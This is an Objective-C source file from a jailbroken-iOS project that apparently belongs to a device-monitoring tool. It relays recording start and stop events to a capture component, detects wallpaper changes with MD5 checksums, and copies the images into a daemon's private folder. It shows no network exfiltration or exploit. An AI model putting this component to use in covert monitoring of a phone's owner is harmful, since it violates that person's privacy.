/**
 - Project name :  MSFSP
 - Class name   :  MediaUtils
 - Version      :  1.0  
 - Purpose      :  For MS
 - Copy right   :  14/02/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */


#import "MediaUtils.h"
#import "MessagePortIPCSender.h"
#import "SBWallpaperImage.h"
#import "DaemonPrivateHome.h"
#import "DefStd.h"
#import "CRC32.h"

#import <CommonCrypto/CommonDigest.h>

@interface MediaUtils (private)

- (BOOL) relayWallpaperNotification: (NSString *) aWallPaperFile;
- (NSString *) completeFilePath: (NSString *) aFileName;
- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName;
- (void) main: (NSDictionary *) aInfo;

@end


@implementation MediaUtils

+ (void) setTimeStamp: (NSString *) aTSFileName {
	NSDate *date = [NSDate date];
	NSTimeInterval now = [date timeIntervalSince1970];
	
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *filePath = [mediaUtils completeFilePath:aTSFileName];
	if (![fm fileExistsAtPath:filePath]) {
		[[NSData dataWithBytes:&now length:sizeof(NSTimeInterval)] writeToFile:filePath atomically:YES];
	}
	[mediaUtils release];
	mediaUtils = nil;
}

+ (void) resetTimeStamp: (NSString *) aTSFileName {
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	NSFileManager *fm = [NSFileManager defaultManager];
	NSString *filePath = [mediaUtils completeFilePath:aTSFileName];
	if ([fm fileExistsAtPath:filePath]) {
		[fm removeItemAtPath:filePath error:nil];
	}
	[mediaUtils release];
	mediaUtils = nil;
}

+ (BOOL) isHomeLockShareWallpaper {
	/*	Note that HomeBackgroundThumbnail.jpg and HomeBackground.cpbitmap exist only 
		when home screen image and lock screen image are not shared.
	 */
	BOOL itsShared = TRUE;
	NSString *wallpaperPath = [NSString stringWithString:@"/private/var/mobile/Library/SpringBoard/"];
	NSString *homeWallpaperFileName = [NSString stringWithString:@"HomeBackground.cpbitmap"];
	//NSString *lockBackgroundFileName = [NSString stringWithString:@"LockBackground.cpbitmap"];
	NSFileManager *fileManager = [NSFileManager defaultManager];
	NSArray *fileSysItems = [fileManager contentsOfDirectoryAtPath:wallpaperPath error:nil];
	for (NSString *file in fileSysItems) {
		if ([file isEqualToString:homeWallpaperFileName]) {
			itsShared = FALSE;
			break;
		}
	}
	return (itsShared);
}

/**
 - Method name:						sendMediaCapturingNotification:
 - Purpose:							This method is used to send media information to the media capture component for START RECORDING event
 - Argument list and description:	aMediaType (NSString)
 - Return description:				No Return
 */

- (void) sendMediaCapturingNotification: (NSString *) aMediaType {
	 DLog (@"Start recording...")
	NSMutableDictionary *dictionary = [[NSMutableDictionary alloc]init];
	[dictionary setValue:[NSNumber numberWithInt:0] forKey:kMediaNotification];		// 0:	recording
	[dictionary setValue:aMediaType forKey:kMediaType];
	
	NSMutableData* data = [[NSMutableData alloc] init];
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:dictionary forKey:kMediaMonitorKey];
	[archiver finishEncoding];
	
	[self sendData:data];
	
	[data release];
	data = nil;
	[archiver release];
	archiver = nil;
	[dictionary release];
	dictionary = nil;
}

/**
 - Method name:						sendMediaNotificationWithMediaType:
 - Purpose:							This method is used to send media information to the media capture component for STOP RECORDING event
 - Argument list and description:	aMediaType (NSString)
 - Return description:				No Return
*/

- (void) sendMediaNotificationWithMediaType:(NSString *) aMediaType {
	NSMutableDictionary *dictionary = [[NSMutableDictionary alloc]init];
	[dictionary setValue:[NSNumber numberWithInt:1] forKey:kMediaNotification];		// 1:	stopped recording
	[dictionary setValue:aMediaType forKey:kMediaType];
	[dictionary setValue:@"" forKey:kMediaPath];
	
	NSMutableData* data = [[NSMutableData alloc] init];
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	[archiver encodeObject:dictionary forKey:kMediaMonitorKey];
	[archiver finishEncoding];
	
	[self sendData:data];
	
	[data release];
	data = nil;
	[archiver release];
	archiver = nil;
	[dictionary release];
	dictionary = nil;
    DLog (@"Captured Media...")
}

/**
 - Method name: sendWallPaperNotification:
 - Purpose:This method is used to send Wallpaper information to the media capture component
 - Argument list and description:aWallPaperInfo (id)
 - Return description:No Return
*/

- (void) sendWallPaperNotification: (id) aWallPaperInfo {
	// /xx/xx/wp_TS.jpeg
	DLog (@"send wallpaper !!!")
	BOOL success = NO;
	NSString *wallPaperFilePath=[NSString stringWithFormat:@"%@wp_%lf.jpeg",[self wallPaperDirectoryPath],[[NSDate date]timeIntervalSince1970]];
	if([aWallPaperInfo isKindOfClass:[UIImage class]]) {
		UIImage *wallImage = aWallPaperInfo;
		NSData *wallPaperData=UIImageJPEGRepresentation(wallImage,1.0);
		[wallPaperData writeToFile:wallPaperFilePath atomically:YES];
		success = [self relayWallpaperNotification:wallPaperFilePath];
	} else if ([aWallPaperInfo isKindOfClass:[NSData class]]) {
		NSData *wallPaperData = (NSData *)aWallPaperInfo;
		NSError *error = nil;
		[wallPaperData writeToFile:wallPaperFilePath options:0 error:&error];
		if (error) {
			DLog (@"error = %@", error);
		}
		success = [self relayWallpaperNotification:wallPaperFilePath];
	}
	if (!success) {
		NSFileManager *fileManager = [NSFileManager defaultManager];
		[fileManager removeItemAtPath:wallPaperFilePath error:nil];
	}
}

/**
 - Method name:						sendData:
 - Purpose:							This method is used to Write Media information into the Message Port
 - Argument list and description:	aData (NSData)
 - Return description:				No Return
 */

- (BOOL) sendData: (NSData *) aData {
	BOOL success = NO;
	if (!(success = [self sendData:aData toPort:kMediaPort1])) { // Load balance
		success = [self sendData:aData toPort:kMediaPort2];
	}
	return (success);
}

/**
 - Method name: wallPaperDirectoryPath
 - Purpose:This method is used to get the wallPaperPath 
 - Argument list and description: No Argument
 - Return description: path (NSString)
 */

- (NSString *) wallPaperDirectoryPath {
	NSString *wallDirPath = [[DaemonPrivateHome daemonSharedHome] stringByAppendingFormat:@"media/wallpaper/"];
	[DaemonPrivateHome createDirectoryAndIntermediateDirectories:wallDirPath];
	return wallDirPath;
}

- (NSString *) wallpaperChecksumFilePath: (NSString *) aPath  {
		return [self completeFilePath:aPath];
}

- (void) parallelCheckWallpaper {
	DLog(@"parallelCheckWallpaper")
	[NSThread detachNewThreadSelector:@selector(main:) toTarget:self withObject:nil];
}

- (BOOL) relayWallpaperNotification: (NSString *) aWallPaperFile {
	NSMutableDictionary *dictionary=[[NSMutableDictionary alloc]init];
	NSMutableData* writeData = [[NSMutableData alloc] init];
	[dictionary setValue:[NSNumber numberWithInt:1] forKey:kMediaNotification];
	[dictionary setValue:kMediaTypeWallPaper forKey:kMediaType];
	[dictionary setValue:aWallPaperFile forKey:kMediaPath];
	
	NSKeyedArchiver *archiver = [[NSKeyedArchiver alloc] initForWritingWithMutableData:writeData];
	[archiver encodeObject:dictionary forKey:kMediaMonitorKey];
	[archiver finishEncoding];
	
	BOOL success = [self sendData:writeData];
	
	[archiver release];
	archiver = nil;
	[writeData release];
	writeData = nil;
	[dictionary release];
	dictionary = nil;
	DLog (@"Captured WallPaper....")
	return (success);
}

- (NSString *) completeFilePath: (NSString *) aFileName {
	NSString * path = [[DaemonPrivateHome daemonSharedHome] stringByAppendingString:aFileName];
	return (path);
}

- (BOOL) sendData: (NSData *) aData toPort: (NSString *) aPortName {
	BOOL success = FALSE;
	MessagePortIPCSender* messagePortSender = [[MessagePortIPCSender alloc] initWithPortName:aPortName];
	success = [messagePortSender writeDataToPort:aData];
	[messagePortSender release];
	return (success);
}

- (BOOL) isHomeScreenChanged {
	DLog (@"After Activate application, so no previous home/lock screen MD5 data")
	NSFileManager *fileManager			= [NSFileManager defaultManager];
	NSDictionary *homeScreenAttributes	= [fileManager attributesOfItemAtPath:@"/private/var/mobile/Library/SpringBoard/HomeBackgroundThumbnail.jpg" error:nil];
	NSDictionary *lockScreenAttributes	= [fileManager attributesOfItemAtPath:@"/private/var/mobile/Library/SpringBoard/LockBackgroundThumbnail.jpg" error:nil];
	NSDate *homeModificationDate		= [homeScreenAttributes fileModificationDate];
	NSDate *lockModificationDate		= [lockScreenAttributes fileModificationDate];
	return [homeModificationDate compare:lockModificationDate] == NSOrderedDescending;	 // receiver is later in time than another date
}

- (void) main: (NSDictionary *) aInfo {
	DLog(@"main:")
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	[NSThread sleepForTimeInterval:3.00];
	
	BOOL isLockAndHomeShareWallpaper = [MediaUtils isHomeLockShareWallpaper];
	DLog(@"isLockAndHomeShareWallpaper %d", isLockAndHomeShareWallpaper)
	
	UIImage *currentLockImage = [UIImage imageWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/LockBackgroundThumbnail.jpg"]; ;
	UIImage *currentHomeImage = [UIImage imageWithContentsOfFile:@"/private/var/mobile/Library/SpringBoard/HomeBackgroundThumbnail.jpg"];
	NSData *currentLockData = UIImageJPEGRepresentation(currentLockImage, 1.0);
	NSData *currentHomeData = UIImageJPEGRepresentation(currentHomeImage, 1.0);
	
	MediaUtils *mediaUtils = [[MediaUtils alloc] init];
	
	NSData *previousHomeMD5Data = [NSData dataWithContentsOfFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum]];
	NSData *previousLockMD5Data = [NSData dataWithContentsOfFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked]];
	DLog (@"previous home md5 %@", previousHomeMD5Data)
	DLog (@"previous lock md5 %@", previousLockMD5Data)
	//DLog (@"current home or wallpaper are not same as the previous")

	if (isLockAndHomeShareWallpaper) {
		DLog (@"---- share wallpaper ----")	// no current home image exists		
		unsigned char md5[16];	
		CC_MD5([currentLockData bytes], [currentLockData length], md5);
		NSData *currentLockMD5Data = [NSData dataWithBytes:md5 length:16];		// md5 for current lock/home image		
		DLog (@"current share md5 %@", currentLockMD5Data)
		
		if (![currentLockMD5Data isEqualToData:previousHomeMD5Data ] &&			// the current is NOT same as home and lock
			![currentLockMD5Data isEqualToData:previousLockMD5Data ]) {
			DLog (@"current shared wallpaper are NOT same as both previous")
			[mediaUtils sendWallPaperNotification:currentLockData];
			[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
			[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
		} else {
			if ([currentLockMD5Data isEqualToData:previousHomeMD5Data]) {
				DLog (@"same as HOME")
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
			} else {
				DLog (@"same as LOCK")
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
			}
		}
	} else {
		DLog (@"---- NOT share wallpaper ----")
		// -- calculate current lock screen MD5 data
		unsigned char md5ForLock[16];
		CC_MD5([currentLockData bytes], [currentLockData length], md5ForLock);
		NSData *currentLockMD5Data = [NSData dataWithBytes:md5ForLock length:16];		// md5 for current lock image
		DLog (@"current lock md5 %@", currentLockMD5Data)

		// -- calculate current home screen MD5 data		
		unsigned char md5ForHome[16];
		CC_MD5([currentHomeData bytes], [currentHomeData length], md5ForHome);
		NSData *currentHomeMD5Data = [NSData dataWithBytes:md5ForHome length:16];		// md5 for current home image		
		DLog (@"current home md5 %@", currentHomeMD5Data)

		if (previousHomeMD5Data == nil					&&								// after activate previousHomeMD5Data and previousLockMD5Data are not created yet
			previousLockMD5Data == nil)					{			
			if ([self isHomeScreenChanged])	{ 
				DLog (@"Home screen is change (first time after activate)")
				[mediaUtils sendWallPaperNotification:currentHomeData];								
			} else {
				DLog (@"Lock screen is change (first time after activate)")	
				[mediaUtils sendWallPaperNotification:currentLockData];
			}			
			
			[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
			[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				
		// figure out if the current HOME image duplicates with the previous HOME image or not
		} else if ([currentHomeMD5Data isEqualToData:previousHomeMD5Data] &&
				   [currentLockMD5Data isEqualToData:previousLockMD5Data]) {
			DLog (@"---- UN-SHARE CASE:  do nothing: home and lock images are SAME as previous ----")
		} else {
			// find the changed one (home screen or lock screen)
			if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data] && 
				![currentLockMD5Data isEqualToData:previousLockMD5Data]) {
				DLog (@"HOME and LOCK changes")				
				// save new MD5 data to the file				
				[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				[mediaUtils sendWallPaperNotification:currentHomeData];
			} else if (![currentHomeMD5Data isEqualToData:previousHomeMD5Data]){
				DLog (@"HOME screen changes")
				[currentHomeMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksum] atomically:YES];
				[mediaUtils sendWallPaperNotification:currentHomeData];
			} else {
				DLog (@"LOCK screen changes")
				[currentLockMD5Data writeToFile:[mediaUtils wallpaperChecksumFilePath:kFileWallPaperChecksumLocked] atomically:YES];
				[mediaUtils sendWallPaperNotification:currentLockData];
			}
		
		}
	}
	[mediaUtils release];
	mediaUtils = nil;
	[pool release];
}
	
/**
 - Method name: dealloc
 - Purpose:  This method is used to manage memory
 - Argument list and description: No Argument
 - Return type and description: No Return 
*/

- (void) dealloc {
	[super dealloc];	
}

@end
